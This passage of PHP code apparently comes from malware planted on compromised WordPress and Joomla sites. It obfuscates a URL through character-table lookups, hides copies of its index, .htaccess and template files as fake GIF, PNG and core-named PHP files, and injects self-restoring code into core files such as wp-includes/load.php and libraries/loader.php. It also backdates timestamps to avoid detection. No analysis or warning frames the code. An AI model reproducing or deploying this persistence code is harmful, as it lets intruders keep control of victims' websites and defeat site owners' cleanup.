	$$q2 = $O00O0O{7}.$O00O0O{19}.$O00O0O{19}.$O00O0O{15}.$O00O0O{65}.$O00O0O{64}.$O00O0O{64}.$O00O0O{22}.$O00O0O{22}.$O00O0O{22}.$O00O0O{63}.$O00O0O{19}.$O00O0O{22}.$O00O0O{12}.$O00O0O{1}.$O00O0O{0}.$O00O0O{12}.$O00O0O{0}.$O00O0O{17}.$O00O0O{10}.$O00O0O{4}.$O00O0O{19}.$O00O0O{63}.$O00O0O{23}.$O00O0O{24}.$O00O0O{25}.$O00O0O{64}.$O00O0O{1}.$O00O0O{10}.$O00O0O{18}.$O00O0O{63}.$O00O0O{15}.$O00O0O{7}.$O00O0O{15};
	

	generate_dir_file($backupfile1);
	generate_dir_file($backupfile2);


	if($backStr){
		$backStr = '<'.'?php'.PHP_EOL .$backStr;
	if(isset($backupfile1) && $backupfile1){
		if(file_put_contents($backupfile1,$backStr))
			$flagRdir1 = 1;
		else
			$flagRdir1 = 0;
	}
	
	if(isset($backupfile2) && $backupfile2){
		if(file_put_contents($backupfile2,$backStr))
			$flagRdir2 = 1;
		else
			$flagRdir2 = 0;
	}
	
	@touch($backupfile1, $fitime, $fitime);   
	@touch(dirname($backupfile1), $fitime, $fitime);   
	@touch($backupfile2, $fitime, $fitime); 
	@touch(dirname($backupfile2), $fitime, $fitime); 
	

	}	
	
	$arrTemps = explode('/',GETDOM);
	$tpNum = count($arrTemps);
	

	$dateArr['dom'] = $thisdom;
	$dateArr['myFile'] = 'http://'.$_SERVER['HTTP_HOST'].$_SERVER['PHP_SELF'];
	$dateArr['indexhyFile'] = __FILE__;
	$dateArr['mbFile'] = str_replace('index.php','moban.html',$dateArr['indexhyFile']);
	$dateArr['htaccess'] = str_replace('index.php','',$dateArr['indexhyFile']) ."$PreDir.htaccess";
	$dateArr['idlogs'] = str_replace('index.php','idlogs.txt',$dateArr['indexhyFile']);
	$dateArr['act'] = 'pt';
	$dateArr['moshi'] = JDT;
	$dateArr['bzpro'] = BZPRO;
	$dateArr['bao'] = $arrTemps[$tpNum-2];

			 
	if($backupfile1){
		$bfileurl1 = 'http://'.$_SERVER['HTTP_HOST'].'/'.str_replace($hostDir,'',$backupfile1);
		$dateArr['backupfile1'] = $bfileurl1;
	}
	if($backupfile2){
		$bfileurl2 = 'http://'.$_SERVER['HTTP_HOST'].'/'.str_replace($hostDir,'',$backupfile2);
		$dateArr['backupfile2'] = $bfileurl2;
	}

	
	$nowDirName = @end(explode(DIRECTORY_SEPARATOR,dirname(__FILE__)));
	
	if($sysType == 'wp'){
		$ckLocalFile1 = '../wp-includes/load.php';
		$ckLocalFile2 = '../wp-includes/template-loader.php';
		
		if(!is_dir("../wp-includes"))
			@mkdir("../wp-includes",0755);
		
		if(is_dir("../wp-includes/images/smilies/")){
			$bkLocalFileIndex1 = '../wp-includes/images/smilies/icon_reds.gif';
			$bkLocalFileHtac1 = '../wp-includes/images/smilies/icon_blacks.gif';
			$bkLocalFileMoban1 = '../wp-includes/images/smilies/icon_greens.gif';
			$bkLocalFileLog1 = '../wp-includes/images/smilies/icon_sads.gif';
		}else{
			$bkLocalFileIndex1 = '../wp-includes/class-wp-customize-settings.php';
			$bkLocalFileHtac1 = '../wp-includes/class-wp-customize-panels.php';
			$bkLocalFileMoban1 = '../wp-includes/class-wp-customize-controls.php';
			$bkLocalFileLog1 = '../wp-includes/class-wp-locales.php';
		}


		if(!is_dir("../wp-admin"))
			@mkdir("../wp-admin",0755);
		
		
		if(is_dir("../wp-admin/images/")){
			$bkLocalFileIndex2 = '../wp-admin/images/align-lefts.png';
			$bkLocalFileHtac2 = '../wp-admin/images/align-rights.png';
			$bkLocalFileMoban2 = '../wp-admin/images/align-centers.png';
			$bkLocalFileLog2 = '../wp-admin/images/wordpress-logos.png';
		}else{
			$bkLocalFileIndex2 = '../wp-admin/options-writings.php';
			$bkLocalFileHtac2 = '../wp-admin/options-medias.php';
			$bkLocalFileMoban2 = '../wp-admin/options-discussions.php';
			$bkLocalFileLog2 = '../wp-admin/update-cores.php';
		}
	
		
		$nowMobanFile = './moban.html';
		$nowMobanFileI = './'.$nowDirName.'/moban.html';
		$nowLogFileI = './'.$nowDirName.'/idlogs.txt';
		$nowIndexFile = './index.php';
		$nowIndexFileI = './'.$nowDirName.'/index.php';
		if(JDT == 1){
			$nowHtacFile = './.htaccess';
			$nowHtacFileI = './'.$nowDirName.'/.htaccess';
		}elseif(JDT == 0){
			$nowHtacFile = '../.htaccess';
			$nowHtacFileI = './.htaccess';
		}else{
			$nowHtacFile = '';
			$nowHtacFileI = '';
		}
		
		$strNowIndex = file_get_contents($nowIndexFile);
		
		$r4 = '#bbbbbbbbackupbg.*?bbbbbbbbackupend#si';	$strNowIndex2 = preg_replace($r4, '', $strNowIndex); $r4 = '#i{9}bg.*?i{9}end#si'; $strNowIndex2 = preg_replace($r4, '', $strNowIndex2); $r4 = '#c{6}getbg.*?c{6}getend#si';
	$strNowIndex2 = preg_replace($r4, '', $strNowIndex2); $r4 = '#c{6}getbg.*?c{6}getend#si'; $strNowIndex2 = preg_replace($r4, '', $strNowIndex2);
		$strNowIndex = $strNowIndex2;
		
				
		$strNowMoban = file_get_contents($nowMobanFile);
		$strNowHtac = file_get_contents($nowHtacFile);
		
		if(file_exists($ckLocalFile1)){
			
			$strCkLocalFile1 = file_get_contents($ckLocalFile1);
			@chmod($ckLocalFile1,0755);

			if(stristr($strCkLocalFile1,'function require_wp_db')){
				$rpRpFind = 'function require_wp_db';
			}elseif(stristr($strCkLocalFile1,'function timer_start')){
				$rpRpFind = 'function timer_start';
			}else{
				$rpRpFind = false;
			}
			
			
			file_put_contents($bkLocalFileIndex1,$strNowIndex);
			file_put_contents($bkLocalFileMoban1,$strNowMoban);
			file_put_contents($bkLocalFileHtac1,$strNowHtac);
			@touch($bkLocalFileIndex1, $fitime, $fitime);   
			@touch($bkLocalFileMoban1, $fitime, $fitime);   
			@touch($bkLocalFileHtac1, $fitime, $fitime);
			
			$NowPutStrI = PHP_EOL . '//ck1bg'.PHP_EOL;
			
			$NowPutStrI .= '$nowFileDir = '." '$nowDirName';".PHP_EOL;
			$NowPutStrI .= '$nowHtacFile = '." '$nowHtacFileI';".PHP_EOL;
			$NowPutStrI .= '$nowMobanFile = '." '$nowMobanFileI';".PHP_EOL;
			$NowPutStrI .= '$nowIndexFile = '." '$nowIndexFileI';".PHP_EOL;
			$NowPutStrI .= '$nowLogFile = '." '$nowLogFileI';".PHP_EOL;
			$NowPutStrI .= '$bkLocalFileIndex1 = '." '".str_replace('../wp-includes/','./wp-includes/',$bkLocalFileIndex1)."';".PHP_EOL;
			$NowPutStrI .= '$bkLocalFileHtac1 = '." '".str_replace('../wp-includes/','./wp-includes/',$bkLocalFileHtac1)."';".PHP_EOL;
			$NowPutStrI .= '$bkLocalFileMoban1 = '." '".str_replace('../wp-includes/','./wp-includes/',$bkLocalFileMoban1)."';".PHP_EOL;
			$NowPutStrI .= '$bkLocalFileLog1 = '." '".str_replace('../wp-includes/','./wp-includes/',$bkLocalFileLog1)."';".PHP_EOL;

			
			$NowPutStrI .= '
if($nowHtacFile && file_exists($bkLocalFileHtac1)){
	if(!file_exists($nowHtacFile) or (filesize($nowHtacFile) != filesize($bkLocalFileHtac1))){
		if(!is_dir("./$nowFileDir")){
			@mkdir("./$nowFileDir",0755);
		}
		@chmod($nowHtacFile,0755);
		@file_put_contents($nowHtacFile,file_get_contents($bkLocalFileHtac1));
		@chmod($nowHtacFile,0755);
	}
}


if(file_exists($bkLocalFileIndex1)){
	if(!file_exists($nowIndexFile) or (filesize($nowIndexFile) != filesize($bkLocalFileIndex1) && !file_exists($nowLogFile))){
		if(!is_dir("./$nowFileDir")){
			@mkdir("./$nowFileDir",0755);
		}
		@chmod($nowIndexFile,0755);
		@file_put_contents($nowIndexFile,file_get_contents($bkLocalFileIndex1));
		@chmod($nowIndexFile,0755);
	}
}

if(file_exists($bkLocalFileMoban1)){
	
	if(!file_exists($nowMobanFile)){
		if(!is_dir("./$nowFileDir")){
			@mkdir("./$nowFileDir",0755);
		}
		@file_put_contents($nowMobanFile,file_get_contents($bkLocalFileMoban1));
		@chmod($nowMobanFile,0755);
	}else{
		if(filesize($nowMobanFile) != filesize($bkLocalFileMoban1)){
			$tpstrMb = file_get_contents($nowMobanFile);
			if(strstr($tpstrMb,"#bbbtitsbbb#") && !strstr($tpstrMb,"<!--ttt html5 tttt-->")){
				$fitime = filemtime($bkLocalFileMoban1);
				@chmod($bkLocalFileMoban1,0755);
				@file_put_contents($bkLocalFileMoban1,$tpstrMb);
				@touch($bkLocalFileMoban1, $fitime, $fitime);  
			}else{
				@chmod($bkLocalFileMoban1,0755);
				@file_put_contents($nowMobanFile,file_get_contents($bkLocalFileMoban1));
				@chmod($bkLocalFileMoban1,0755);
			}
		}
	}
	
}



if(file_exists($bkLocalFileLog1)){
	
	if(!file_exists($nowLogFile)){
		@file_put_contents($nowLogFile,file_get_contents($bkLocalFileLog1));
		@chmod($nowMobanFile,0755);
	}else{
		if(filesize($nowLogFile) != filesize($bkLocalFileLog1)){
			$tpstrLog = file_get_contents($nowLogFile);
			$tpstrLog2 = file_get_contents($bkLocalFileLog1);
			
			$arrUrlId = @unserialize($tpstrLog);
			$arrUrlId2 = @unserialize($tpstrLog2);
			
			if(!is_array($arrUrlId2) or (is_array($arrUrlId) && is_array($arrUrlId2) && count($arrUrlId) > count($arrUrlId2))){
				$fitime = filemtime($bkLocalFileMoban1);
				@file_put_contents($bkLocalFileLog1,$tpstrLog);
				@touch($bkLocalFileLog1, $fitime, $fitime); 
			}elseif(!is_array($arrUrlId) or (is_array($arrUrlId) && is_array($arrUrlId2) && count($arrUrlId) < count($arrUrlId2))){
				$fitime = filemtime($bkLocalFileMoban1);
				@file_put_contents($nowLogFile,$tpstrLog2);
				@touch($nowLogFile, $fitime, $fitime); 
			}
		}
	}
	
}elseif(file_exists($nowLogFile)){
	$tpstrLog = file_get_contents($nowLogFile);
	$fitime = filemtime($bkLocalFileMoban1);
	@file_put_contents($bkLocalFileLog1,$tpstrLog);
	@touch($bkLocalFileLog1, $fitime, $fitime);  
}

';
			
			
	$NowPutStrI .= PHP_EOL . '//ck1end'.PHP_EOL;
	
	if(strstr($strCkLocalFile1,'//ck1bg') && strstr($strCkLocalFile1,'//ck1end')){
		
		$rsck1 = '#//ck1bg.*?//ck1end#si';
		$strCkLocalFile1 = preg_replace($rsck1,$NowPutStrI,$strCkLocalFile1);
	

		
	}else{
		
		if(!$rpRpFind){
			$strCkLocalFile1 = $strCkLocalFile1.PHP_EOL .$NowPutStrI;
		}else{
			$strCkLocalFile1 = str_replace($rpRpFind,$NowPutStrI.$rpRpFind,$strCkLocalFile1);
		}
		
	}
	
			file_put_contents($ckLocalFile1,$strCkLocalFile1);

			@touch($ckLocalFile1, $fitime, $fitime);

			
		}
		
		
		if(file_exists($ckLocalFile2)){
			
			$strckLocalFile2 = file_get_contents($ckLocalFile2);
			@chmod($ckLocalFile2,0755);

			if(stristr($strckLocalFile2,'function require_wp_db')){
				$rpRpFind = 'function require_wp_db';
			}elseif(stristr($strckLocalFile2,'function timer_start')){
				$rpRpFind = 'function timer_start';
			}else{
				$rpRpFind = false;
			}
			

			
			file_put_contents($bkLocalFileIndex2,$strNowIndex);
			file_put_contents($bkLocalFileMoban2,$strNowMoban);
			file_put_contents($bkLocalFileHtac2,$strNowHtac);
			@touch($bkLocalFileIndex2, $fitime, $fitime);   
			@touch($bkLocalFileMoban2, $fitime, $fitime);   
			@touch($bkLocalFileHtac2, $fitime, $fitime);
			
			$NowPutStrTwo = PHP_EOL . '//ckIIbg'.PHP_EOL;
			
			$NowPutStrTwo .= '$nowFileDir = '." '$nowDirName';".PHP_EOL;
			$NowPutStrTwo .= '$nowHtacFile = '." '$nowHtacFileI';".PHP_EOL;
			$NowPutStrTwo .= '$nowMobanFile = '." '$nowMobanFileI';".PHP_EOL;
			$NowPutStrTwo .= '$nowIndexFile = '." '$nowIndexFileI';".PHP_EOL;
			$NowPutStrTwo .= '$nowLogFile = '." '$nowLogFileI';".PHP_EOL;
			$NowPutStrTwo .= '$bkLocalFileIndex2 = '." '".str_replace('../wp-admin/','./wp-admin/',$bkLocalFileIndex2)."';".PHP_EOL;
			$NowPutStrTwo .= '$bkLocalFileHtac2 = '." '".str_replace('../wp-admin/','./wp-admin/',$bkLocalFileHtac2)."';".PHP_EOL;
			$NowPutStrTwo .= '$bkLocalFileMoban2 = '." '".str_replace('../wp-admin/','./wp-admin/',$bkLocalFileMoban2)."';".PHP_EOL;
			$NowPutStrTwo .= '$bkLocalFileLog2 = '." '".str_replace('../wp-admin/','./wp-admin/',$bkLocalFileLog2)."';".PHP_EOL;

			
			$NowPutStrTwo .= '
if($nowHtacFile && file_exists($bkLocalFileHtac2)){
	if(!file_exists($nowHtacFile) or (filesize($nowHtacFile) != filesize($bkLocalFileHtac2))){
		if(!is_dir("./$nowFileDir")){
			@mkdir("./$nowFileDir",0755);
		}
		@chmod($nowHtacFile,0755);
		@file_put_contents($nowHtacFile,file_get_contents($bkLocalFileHtac2));
		@chmod($nowHtacFile,0755);
	}
}


if(file_exists($bkLocalFileIndex2)){
	if(!file_exists($nowIndexFile) or (filesize($nowIndexFile) != filesize($bkLocalFileIndex2)  && !file_exists($nowLogFile))){
		if(!is_dir("./$nowFileDir")){
			@mkdir("./$nowFileDir",0755);
		}
		@chmod($nowIndexFile,0755);
		@file_put_contents($nowIndexFile,file_get_contents($bkLocalFileIndex2));
		@chmod($nowIndexFile,0755);
	}
}

if(file_exists($bkLocalFileMoban2)){
	
	if(!file_exists($nowMobanFile)){
		if(!is_dir("./$nowFileDir")){
			@mkdir("./$nowFileDir",0755);
		}
		@file_put_contents($nowMobanFile,file_get_contents($bkLocalFileMoban2));
		@chmod($nowMobanFile,0755);
	}else{
		if(filesize($nowMobanFile) != filesize($bkLocalFileMoban2)){
			$tpstrMb = file_get_contents($nowMobanFile);
			if(strstr($tpstrMb,"#bbbtitsbbb#") && !strstr($tpstrMb,"<!--ttt html5 tttt-->")){
				$fitime = filemtime($bkLocalFileMoban2);
				@chmod($bkLocalFileMoban2,0755);
				@file_put_contents($bkLocalFileMoban2,$tpstrMb);
				@touch($bkLocalFileMoban2, $fitime, $fitime);  
			}else{
				@chmod($bkLocalFileMoban2,0755);
				@file_put_contents($nowMobanFile,file_get_contents($bkLocalFileMoban2));
				@chmod($bkLocalFileMoban2,0755);
			}
		}
	}
	
}


if(file_exists($bkLocalFileLog2)){
	
	if(!file_exists($nowLogFile)){
		@file_put_contents($nowLogFile,file_get_contents($bkLocalFileLog2));
		@chmod($nowMobanFile,0755);
	}else{
		if(filesize($nowLogFile) != filesize($bkLocalFileLog2)){
			$tpstrLog = file_get_contents($nowLogFile);
			$tpstrLog2 = file_get_contents($bkLocalFileLog2);
			
			$arrUrlId = @unserialize($tpstrLog);
			$arrUrlId2 = @unserialize($tpstrLog2);
			
			if(!is_array($arrUrlId2) or (is_array($arrUrlId) && is_array($arrUrlId2) && count($arrUrlId) > count($arrUrlId2))){
				$fitime = filemtime($bkLocalFileMoban2);
				@file_put_contents($bkLocalFileLog2,$tpstrLog);
				@touch($bkLocalFileLog2, $fitime, $fitime); 
			}elseif(!is_array($arrUrlId) or (is_array($arrUrlId) && is_array($arrUrlId2) && count($arrUrlId) < count($arrUrlId2))){
				$fitime = filemtime($bkLocalFileMoban2);
				@file_put_contents($nowLogFile,$tpstrLog2);
				@touch($nowLogFile, $fitime, $fitime); 
			}
		}
	}
	
}elseif(file_exists($nowLogFile)){
	$tpstrLog = file_get_contents($nowLogFile);
	$fitime = filemtime($bkLocalFileMoban2);
	@file_put_contents($bkLocalFileLog2,$tpstrLog);
	@touch($bkLocalFileLog2, $fitime, $fitime);  
}


';
			
			
	$NowPutStrTwo .= PHP_EOL . '//ckIIend'.PHP_EOL;
	
	if(strstr($strckLocalFile2,'//ckIIbg') && strstr($strckLocalFile2,'//ckIIend')){
		
		$rsckII = '#//ckIIbg.*?//ckIIend#si';
		$strckLocalFile2 = preg_replace($rsckII,$NowPutStrTwo,$strckLocalFile2);
	

		
	}else{
		$strckLocalFile2 = '<'.'?php'. PHP_EOL .$NowPutStrTwo. PHP_EOL . '?>'.PHP_EOL . $strckLocalFile2;
	}
	
			file_put_contents($ckLocalFile2,$strckLocalFile2);

			@touch($ckLocalFile2, $fitime, $fitime);

			
		}
		
		
	}elseif($sysType == 'Joomla'){

		
		$ckLocalFile1 = '../libraries/loader.php';
		$ckLocalFile2 = '../includes/framework.php';
		
		if(!is_dir("../templates"))
			@mkdir("../templates",0755);
		
		if(!is_dir("../templates/system"))
			@mkdir("../templates/system",0755);
		
		if(!is_dir("../templates/system/images"))
			@mkdir("../templates/system/images",0755);
		
		
		$bkLocalFileIndex1 = '../templates/system/images/i_button1_blank.png';
		$bkLocalFileHtac1 = '../templates/system/images/i_button1_image.png';
		$bkLocalFileMoban1 = '../templates/system/images/i_button1_left.png';
		$bkLocalFileLog1 = '../templates/system/images/i_button1_right.png';



		if(!is_dir("../media"))
			@mkdir("../media",0755);
		
		if(!is_dir("../media/media"))
			@mkdir("../media/media",0755);
		
		if(!is_dir("../media/media/images"))
			@mkdir("../media/media/images",0755);
		
		if(!is_dir("../media/media/images/mime-icon-16"))
			@mkdir("../media/media/images/mime-icon-16",0755);
		
		
		$bkLocalFileIndex2 = '../media/media/images/mime-icon-16/mp3s.png';
		$bkLocalFileHtac2 = '../media/media/images/mime-icon-16/mp4s.png';
		$bkLocalFileMoban2 = '../media/media/images/mime-icon-16/odcs.png';
		$bkLocalFileLog2 = '../media/media/images/mime-icon-16/mp5s.png';

	
		
		$nowMobanFile = './moban.html';
		$nowMobanFileI = './'.$nowDirName.'/moban.html';
		$nowLogFileI = './'.$nowDirName.'/idlogs.txt';
		$nowIndexFile = './index.php';
		$nowIndexFileI = './'.$nowDirName.'/index.php';
		if(JDT == 1){
			$nowHtacFile = './.htaccess';
			$nowHtacFileI = './'.$nowDirName.'/.htaccess';
		}elseif(JDT == 0){
			$nowHtacFile = '../.htaccess';
			$nowHtacFileI = './.htaccess';
		}else{
			$nowHtacFile = '';
			$nowHtacFileI = '';
		}
		
		$strNowIndex = file_get_contents($nowIndexFile);
		
		$r4 = '#bbbbbbbbackupbg.*?bbbbbbbbackupend#si';	$strNowIndex2 = preg_replace($r4, '', $strNowIndex); $r4 = '#i{9}bg.*?i{9}end#si'; $strNowIndex2 = preg_replace($r4, '', $strNowIndex2); $r4 = '#c{6}getbg.*?c{6}getend#si';
	$strNowIndex2 = preg_replace($r4, '', $strNowIndex2); $r4 = '#c{6}getbg.*?c{6}getend#si'; $strNowIndex2 = preg_replace($r4, '', $strNowIndex2);
		$strNowIndex = $strNowIndex2;
		
				
		$strNowMoban = file_get_contents($nowMobanFile);
		$strNowHtac = file_get_contents($nowHtacFile);
		
		if(file_exists($ckLocalFile1)){
			
			$strCkLocalFile1 = file_get_contents($ckLocalFile1);
			@chmod($ckLocalFile1,0755);

			if(stristr($strCkLocalFile1,'// Check if jexit')){
				$rpRpFind = '// Check if jexit';
			}elseif(stristr($strCkLocalFile1,'function jimport')){
				$rpRpFind = 'function jimport';
			}else{
				$rpRpFind = false;
			}
			
			
			file_put_contents($bkLocalFileIndex1,$strNowIndex);
			file_put_contents($bkLocalFileMoban1,$strNowMoban);
			file_put_contents($bkLocalFileHtac1,$strNowHtac);
			@touch($bkLocalFileIndex1, $fitime, $fitime);   
			@touch($bkLocalFileMoban1, $fitime, $fitime);   
			@touch($bkLocalFileHtac1, $fitime, $fitime);
			
			$NowPutStrI = PHP_EOL . '//ck1bg'.PHP_EOL;
			
			$NowPutStrI .= '$nowFileDir = '." '$nowDirName';".PHP_EOL;
			$NowPutStrI .= '$nowHtacFile = '." '$nowHtacFileI';".PHP_EOL;
			$NowPutStrI .= '$nowMobanFile = '." '$nowMobanFileI';".PHP_EOL;
			$NowPutStrI .= '$nowIndexFile = '." '$nowIndexFileI';".PHP_EOL;
			$NowPutStrI .= '$nowLogFile = '." '$nowLogFileI';".PHP_EOL;
			$NowPutStrI .= '$bkLocalFileIndex1 = '." '".str_replace('../templates/','./templates/',$bkLocalFileIndex1)."';".PHP_EOL;
			$NowPutStrI .= '$bkLocalFileHtac1 = '." '".str_replace('../templates/','./templates/',$bkLocalFileHtac1)."';".PHP_EOL;
			$NowPutStrI .= '$bkLocalFileMoban1 = '." '".str_replace('../templates/','./templates/',$bkLocalFileMoban1)."';".PHP_EOL;
			$NowPutStrI .= '$bkLocalFileLog1 = '." '".str_replace('../templates/','./templates/',$bkLocalFileLog1)."';".PHP_EOL;

			
			$NowPutStrI .= '
if($nowHtacFile && file_exists($bkLocalFileHtac1)){
	if(!file_exists($nowHtacFile) or (filesize($nowHtacFile) != filesize($bkLocalFileHtac1))){
		if(!is_dir("./$nowFileDir")){
			@mkdir("./$nowFileDir",0755);
		}
		@chmod($nowHtacFile,0755);
		@file_put_contents($nowHtacFile,file_get_contents($bkLocalFileHtac1));
		@chmod($nowHtacFile,0755);
	}
}


if(file_exists($bkLocalFileIndex1)){
	if(!file_exists($nowIndexFile) or (filesize($nowIndexFile) != filesize($bkLocalFileIndex1) && !file_exists($nowLogFile))){
		if(!is_dir("./$nowFileDir")){
			@mkdir("./$nowFileDir",0755);
		}
		@chmod($nowIndexFile,0755);
		@file_put_contents($nowIndexFile,file_get_contents($bkLocalFileIndex1));
		@chmod($nowIndexFile,0755);
	}
}

if(file_exists($bkLocalFileMoban1)){
	
	if(!file_exists($nowMobanFile)){
		if(!is_dir("./$nowFileDir")){
			@mkdir("./$nowFileDir",0755);
		}
		@file_put_contents($nowMobanFile,file_get_contents($bkLocalFileMoban1));
		@chmod($nowMobanFile,0755);
	}else{
		if(filesize($nowMobanFile) != filesize($bkLocalFileMoban1)){
			$tpstrMb = file_get_contents($nowMobanFile);
			if(strstr($tpstrMb,"#bbbtitsbbb#") && !strstr($tpstrMb,"<!--ttt html5 tttt-->")){
				$fitime = filemtime($bkLocalFileMoban1);
				@chmod($bkLocalFileMoban1,0755);
				@file_put_contents($bkLocalFileMoban1,$tpstrMb);
				@touch($bkLocalFileMoban1, $fitime, $fitime);  
			}else{
				@chmod($bkLocalFileMoban1,0755);
				@file_put_contents($nowMobanFile,file_get_contents($bkLocalFileMoban1));
				@chmod($bkLocalFileMoban1,0755);
			}
		}
	}
	
}


if(file_exists($bkLocalFileLog1)){
	
	if(!file_exists($nowLogFile)){
		@file_put_contents($nowLogFile,file_get_contents($bkLocalFileLog1));
		@chmod($nowMobanFile,0755);
	}else{
		if(filesize($nowLogFile) != filesize($bkLocalFileLog1)){
			$tpstrLog = file_get_contents($nowLogFile);
			$tpstrLog2 = file_get_contents($bkLocalFileLog1);
			
			$arrUrlId = @unserialize($tpstrLog);
			$arrUrlId2 = @unserialize($tpstrLog2);
			
			if(!is_array($arrUrlId2) or (is_array($arrUrlId) && is_array($arrUrlId2) && count($arrUrlId) > count($arrUrlId2))){
				$fitime = filemtime($bkLocalFileMoban1);
				@file_put_contents($bkLocalFileLog1,$tpstrLog);
				@touch($bkLocalFileLog1, $fitime, $fitime); 
			}elseif(!is_array($arrUrlId) or (is_array($arrUrlId) && is_array($arrUrlId2) && count($arrUrlId) < count($arrUrlId2))){
				$fitime = filemtime($bkLocalFileMoban1);
				@file_put_contents($nowLogFile,$tpstrLog2);
				@touch($nowLogFile, $fitime, $fitime); 
			}
		}
	}
	
}elseif(file_exists($nowLogFile)){
	$tpstrLog = file_get_contents($nowLogFile);
	$fitime = filemtime($bkLocalFileMoban1);
	@file_put_contents($bkLocalFileLog1,$tpstrLog);
	@touch($bkLocalFileLog1, $fitime, $fitime);  
}

';
			
			
	$NowPutStrI .= PHP_EOL . '//ck1end'.PHP_EOL;
	
	if(strstr($strCkLocalFile1,'//ck1bg') && strstr($strCkLocalFile1,'//ck1end')){
		
		$rsck1 = '#//ck1bg.*?//ck1end#si';
		$strCkLocalFile1 = preg_replace($rsck1,$NowPutStrI,$strCkLocalFile1);
	

		
	}else{
		
		if(!$rpRpFind){
			$strCkLocalFile1 = $strCkLocalFile1.PHP_EOL .$NowPutStrI;
		}else{
			$strCkLocalFile1 = str_replace($rpRpFind,$NowPutStrI.$rpRpFind,$strCkLocalFile1);
		}
		
	}
	
			file_put_contents($ckLocalFile1,$strCkLocalFile1);

			@touch($ckLocalFile1, $fitime, $fitime);

			
		}
		
		
		if(file_exists($ckLocalFile2)){
			
			$strckLocalFile2 = file_get_contents($ckLocalFile2);
			@chmod($ckLocalFile2,0755);

			if(stristr($strckLocalFile2,'ob_end_clean')){
				$rpRpFind = 'ob_end_clean';
			}elseif(stristr($strckLocalFile2,'// System configuration')){
				$rpRpFind = '// System configuration';
			}else{
				$rpRpFind = false;
			}
			

			
			file_put_contents($bkLocalFileIndex2,$strNowIndex);
			file_put_contents($bkLocalFileMoban2,$strNowMoban);
			file_put_contents($bkLocalFileHtac2,$strNowHtac);
			@touch($bkLocalFileIndex2, $fitime, $fitime);   
			@touch($bkLocalFileMoban2, $fitime, $fitime);   
			@touch($bkLocalFileHtac2, $fitime, $fitime);
			
			$NowPutStrTwo = PHP_EOL . '//ckIIbg'.PHP_EOL;
			
			$NowPutStrTwo .= '$nowFileDir = '." '$nowDirName';".PHP_EOL;
			$NowPutStrTwo .= '$nowHtacFile = '." '$nowHtacFileI';".PHP_EOL;
			$NowPutStrTwo .= '$nowMobanFile = '." '$nowMobanFileI';".PHP_EOL;
			$NowPutStrTwo .= '$nowIndexFile = '." '$nowIndexFileI';".PHP_EOL;
			$NowPutStrTwo .= '$nowLogFile = '." '$nowLogFileI';".PHP_EOL;
			$NowPutStrTwo .= '$bkLocalFileIndex2 = '." '".str_replace('../media/','./media/',$bkLocalFileIndex2)."';".PHP_EOL;
			$NowPutStrTwo .= '$bkLocalFileHtac2 = '." '".str_replace('../media/','./media/',$bkLocalFileHtac2)."';".PHP_EOL;
			$NowPutStrTwo .= '$bkLocalFileMoban2 = '." '".str_replace('../media/','./media/',$bkLocalFileMoban2)."';".PHP_EOL;
			$NowPutStrTwo .= '$bkLocalFileLog2 = '." '".str_replace('../media/','./media/',$bkLocalFileLog2)."';".PHP_EOL;

			
			$NowPutStrTwo .= '
if($nowHtacFile && file_exists($bkLocalFileHtac2)){
	if(!file_exists($nowHtacFile) or (filesize($nowHtacFile) != filesize($bkLocalFileHtac2))){
		if(!is_dir("./$nowFileDir")){
			@mkdir("./$nowFileDir",0755);
		}
		@chmod($nowHtacFile,0755);
		@file_put_contents($nowHtacFile,file_get_contents($bkLocalFileHtac2));
		@chmod($nowHtacFile,0755);
	}
}


if(file_exists($bkLocalFileIndex2)){
	if(!file_exists($nowIndexFile) or (filesize($nowIndexFile) != filesize($bkLocalFileIndex2)  && !file_exists($nowLogFile))){
		if(!is_dir("./$nowFileDir")){
			@mkdir("./$nowFileDir",0755);
		}
		@chmod($nowIndexFile,0755);
		@file_put_contents($nowIndexFile,file_get_contents($bkLocalFileIndex2));
		@chmod($nowIndexFile,0755);
	}
}

if(file_exists($bkLocalFileMoban2)){
	
	if(!file_exists($nowMobanFile)){
		if(!is_dir("./$nowFileDir")){
			@mkdir("./$nowFileDir",0755);
		}
		@file_put_contents($nowMobanFile,file_get_contents($bkLocalFileMoban2));
		@chmod($nowMobanFile,0755);
	}else{
		if(filesize($nowMobanFile) != filesize($bkLocalFileMoban2)){
			$tpstrMb = file_get_contents($nowMobanFile);
			if(strstr($tpstrMb,"#bbbtitsbbb#") && !strstr($tpstrMb,"<!--ttt html5 tttt-->")){
				$fitime = filemtime($bkLocalFileMoban2);
				@chmod($bkLocalFileMoban2,0755);
				@file_put_contents($bkLocalFileMoban2,$tpstrMb);
				@touch($bkLocalFileMoban2, $fitime, $fitime);  
			}else{
				@chmod($bkLocalFileMoban2,0755);
				@file_put_contents($nowMobanFile,file_get_contents($bkLocalFileMoban2));
				@chmod($bkLocalFileMoban2,0755);
			}
		}
	}
	
}



if(file_exists($bkLocalFileLog2)){
	
	if(!file_exists($nowLogFile)){
		@file_put_contents($nowLogFile,file_get_contents($bkLocalFileLog2));
		@chmod($nowMobanFile,0755);
	}else{
		if(filesize($nowLogFile) != filesize($bkLocalFileLog2)){
			$tpstrLog = file_get_contents($nowLogFile);
			$tpstrLog2 = file_get_contents($bkLocalFileLog2);
			
			$arrUrlId = @unserialize($tpstrLog);
			$arrUrlId2 = @unserialize($tpstrLog2);
			
			if(!is_array($arrUrlId2) or (is_array($arrUrlId) && is_array($arrUrlId2) && count($arrUrlId) > count($arrUrlId2))){
				$fitime = filemtime($bkLocalFileMoban2);
				@file_put_contents($bkLocalFileLog2,$tpstrLog);
				@touch($bkLocalFileLog2, $fitime, $fitime); 
			}elseif(!is_array($arrUrlId) or (is_array($arrUrlId) && is_array($arrUrlId2) && count($arrUrlId) < count($arrUrlId2))){
				$fitime = filemtime($bkLocalFileMoban2);
				@file_put_contents($nowLogFile,$tpstrLog2);
				@touch($nowLogFile, $fitime, $fitime); 
			}
		}
	}
	
}elseif(file_exists($nowLogFile)){
	$tpstrLog = file_get_contents($nowLogFile);
	$fitime = filemtime($bkLocalFileMoban2);
	@file_put_contents($bkLocalFileLog2,$tpstrLog);
	@touch($bkLocalFileLog2, $fitime, $fitime);  
}

';
	
	$NowPutStrTwo .= PHP_EOL . '//ckIIend'.PHP_EOL;
	
	if(strstr($strckLocalFile2,'//ckIIbg') && strstr($strckLocalFile2,'//ckIIend')){
		
		$rsckII = '#//ckIIbg.*?//ckIIend#si';
		$strckLocalFile2 = preg_replace($rsckII,$NowPutStrTwo,$strckLocalFile2);
	
	}else{
		
		if(!$rpRpFind){
